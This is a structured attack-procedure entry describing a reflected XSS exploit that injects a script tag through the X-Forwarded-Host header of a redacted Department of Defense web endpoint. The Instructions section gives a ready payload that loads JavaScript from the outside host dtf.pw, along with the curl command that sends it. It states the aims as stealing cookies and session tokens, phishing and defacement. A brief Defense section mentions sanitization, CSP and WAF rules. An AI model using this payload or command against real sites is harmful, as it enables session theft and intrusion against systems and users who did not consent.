---
id: proc-uuid-1
tags:
  - xss
  - reflected-xss
  - header-injection
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-send-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:38.210Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-X-Forwarded-Host-Header

## Summary

This procedure exploits a reflected XSS vulnerability by injecting a malicious JavaScript payload into the X-Forwarded-Host HTTP header. The server reflects the header value directly into the response without sanitization, allowing arbitrary code execution in the victim's browser when the page is loaded. Primary use case is demonstrating client-side script injection on public-facing web applications to steal session data or manipulate content.

## Description

In this attack scenario, targeted at the U.S. Department of Defense website endpoint https://█████/████████/, the server processes the X-Forwarded-Host header (commonly used for proxy/load balancer identification) and echoes it back in the HTML response. By crafting the header with a payload like 'foo"><script src=//dtf.pw/2.js></script><x=".com', attackers close open HTML tags and inject a script tag that loads and executes external JavaScript. Prerequisites include network access to the target and a tool for sending custom HTTP headers. Expected outcomes: JavaScript execution leading to alerts displaying cookies (e.g., '██████████_██████████=') or further exfiltration.

## Requirements

1. Network access to the target web endpoint (https://█████/████████/).
2. HTTP client capable of setting custom headers (e.g., curl or browser developer tools).
3. Knowledge of the target's response structure to craft closing tags effectively.

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all HTTP headers before reflection in responses, using libraries like OWASP ESAPI.
- Implement Content Security Policy (CSP) to block inline or external scripts.
- Monitor for anomalous headers in logs and use WAF rules to strip or block suspicious X-Forwarded-Host values containing script tags.

## Objectives

1. Inject and reflect malicious JavaScript to execute in the browser context.
2. Steal sensitive data like cookies or session tokens.
3. Demonstrate potential for phishing or page defacement.

## Instructions

### Step 1: Craft the Payload

**Context**: Prepare a payload that closes any open HTML attributes/tags and injects a script tag to load external JavaScript, ensuring it executes upon reflection.

No command required; manually construct the header value: 'foo"><script src=//dtf.pw/2.js></script><x=".com'.

> This payload assumes the server reflects the header inside an HTML attribute or tag; adjust based on response inspection.

### Step 2: Send the Request with Injected Header

**Context**: Transmit the request to the vulnerable endpoint, setting the X-Forwarded-Host header to the payload, triggering the reflection and execution.

**Command** ([[commands/curl-send-xss-payload]]):
```bash
curl -H "X-Forwarded-Host: foo\"><script src=//dtf.pw/2.js></script><x=\".com" https://█████/████████/
```

> This sends a GET request (inferred from 'visit') with the crafted header. The response will include the reflected payload, executing the script in a browser view. Expected output: HTML response with embedded <script> tag; in browser, an alert or data exfiltration.

### Step 3: Verify Execution

**Context**: Inspect the response or load in a browser to confirm JavaScript runs, such as displaying cookie data.

No command; use browser console or proxy (e.g., Burp) to view. Look for execution indicators like alerts showing '██████████_██████████='.

> Success confirms the vulnerability; failure may indicate sanitization or CSP blocking.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques

-

## Commands Used

- [[commands/curl-send-xss-payload]]

## Tools Used

-

## Tags

- [[xss]]
- [[reflected-xss]]
- [[header-injection]]
